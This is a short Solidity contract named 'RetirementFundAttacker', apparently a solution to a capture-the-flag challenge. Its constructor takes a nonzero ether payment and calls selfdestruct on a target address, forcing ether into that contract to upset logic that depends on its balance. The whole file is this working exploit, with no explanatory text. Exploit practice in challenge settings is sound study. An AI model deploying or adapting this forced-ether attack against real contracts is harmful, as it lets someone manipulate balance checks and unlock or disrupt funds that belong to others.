pragma solidity ^0.8.19;

contract RetirementFundAttacker {

    constructor (address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}